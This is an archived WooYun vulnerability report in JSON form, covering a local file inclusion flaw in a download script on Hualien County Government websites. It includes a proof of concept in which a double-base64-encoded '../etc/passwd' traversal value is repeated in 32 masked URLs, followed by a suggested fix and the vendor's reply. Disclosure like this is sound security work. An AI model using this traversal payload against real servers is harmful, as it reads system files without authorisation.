{"id": 78610, "wybug_id": "wooyun-2015-0160038", "wybug_title": "花蓮縣政府通用型 LFI 影響 32 站（臺灣地區）", "wybug_corp": "花蓮縣政府", "wybug_author": "路人甲", "wybug_date": "2015-12-14 12:36", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： 存在 LFI 详细说明：  整個花蓮縣網站幾乎存在該漏洞!   漏洞证明：  原本下載檔案的請求http://**.**.**.**/bin/downloadfile.php?file=WVhSMFlXTm9MemM0TDNCMFlWOHlPVE0zTTE4NU1USTJORGc0WHpFNE56ZzRMbkJrWmc9PQ==欄位file接受外部輸入,從上面value是 base64encode 兩次所產生的將要讀的 ../../../../../../../../../../../../etc/passwd base64兩次 ,構成以下POC, 成功exp:1.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==2.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==3.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==4.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==5.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==6.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==7.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==8.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==9.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==10.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==11.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==12.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==13.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==14.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==15.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==16.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==17.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==18.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==19.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==20.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==21.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==22.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==23.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==24.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==25.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==26.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==27.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==28.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==29.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==30.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==31.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==32.\thttp://**.**.**.**/bin/downloadfile.php?file=TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2TGk0dkxpNHZMaTR2WlhSakwzQmhjM04zWkE9PQ==\n\n   修复方案：  建議basename過濾~和可下載的副檔名限制白名單   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-12-15 22:01 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}